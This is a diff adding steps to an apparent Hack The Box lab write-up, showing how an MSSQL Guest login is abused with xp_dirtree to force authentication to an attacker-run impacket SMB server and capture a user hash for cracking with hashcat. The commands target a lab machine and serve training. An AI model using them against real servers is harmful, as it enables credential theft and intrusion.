@@ -47,4 +47,15 @@
 
 <img width="659" height="203" alt="image" src="https://github.com/user-attachments/assets/9bbc5213-0302-46b6-88a5-64fa603598cd" />
 
-5. 
+5. Enumerating the databases yields no data so we try command execution via the xp_cmdshell stored procedure. This is blocked as well; however, the xp_dirtree is executable as Guest user. We use xp_dirtree to connect to our SMB server hosted on our attacker machine to see if we can get a user hash. This works beautifully!
+
+Start local SMB server using impacket
+`impacket-smbserver -smb2support share ~/htb/escape/recon/share`
+
+Connect to our SMB server using xp_dirtree
+`exec xp_dirtree '\\10.10.15.30\share',1,1;`
+
+<img width="911" height="330" alt="image" src="https://github.com/user-attachments/assets/5885e520-85e1-4d3d-8441-3ec04d40ccc3" />
+
+6. Crack hash offline using hashcat
+
